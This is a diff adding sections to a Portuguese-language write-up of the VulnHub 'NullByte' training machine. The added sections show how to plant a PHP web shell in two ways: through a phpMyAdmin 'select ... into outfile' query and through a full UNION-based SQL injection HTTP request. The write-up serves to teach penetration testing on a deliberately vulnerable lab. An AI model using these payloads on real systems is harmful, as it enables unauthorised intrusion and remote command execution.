@@ -1,6 +1,6 @@
 ---
 title: "VulnHub - NullByte"
-tags: [Linux, Medium]
+tags: [Linux, Medium, Gobuster, Wfuzz, PHPMyAdmin, SQLInjection, SQLMap, SUID, Linpeas, John, Hydra, Bash Brute Force, BurpSuite, Repeater, Exif, Exiftool]
 categories: VulnHub
 ---
 
@@ -499,6 +499,10 @@ Bom, depois verificamos que exploramos mais aqui ou não... vamos prosseguir
 
 ## www-data reverse
 
+Vamos fazer de duas maneiras, uma através do SQLinjection que temos, e outra através do phpmyadmin
+
+### PHPMyAdmin
+
 Agora com essas credenciais podemos pegar um shell de www-data, uma vez que a aplicação phpmyadmin roda como se **www-data** fosse
 
 Vamos ver a versão do phpmyadmin
@@ -507,4 +511,44 @@ Vamos ver a versão do phpmyadmin
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php1.png)
 
+Eu sei que temos um RCE para a versão 4.8, então pode ser que de certo aqui também, tendo em vista ser uma versão mais desatualizada
 
+[Referência](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php2.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php3.png)
+
+Esse não vou conseguir pq não tenho LFI na máquina, mas posso tentar fazer outras coisas aqui... como por exemplo salvar um php malicioso e chamar ele
+
+```php
+select '<?php echo "<pre>".shell_exec($_GET["cmd"]);' into outfile '/var/www/html/uploads/shell.php'
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php4.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php5.png)
+
+Feito! Agora acessamos ele. Temos RCE!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php6.png)
+
+Agora pegamos nosso reverse shell
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php7.png)
+
+### SQLInjection
+
+Seguindo a mesma ideia, podemos inserir isso dentro do servidor através do SQLInjection que temos
+
+```
+GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+'<%3fphp+echo+"<pre>".shell_exec($_GET["cmd"])%3b',2,3+into+outfile+'/var/www/html/uploads/sql.php'--+- HTTP/1.1
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php8.png)
+
+Testando agora...
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php9.png)
+
+Isso já deu bastante... por essa máquina.
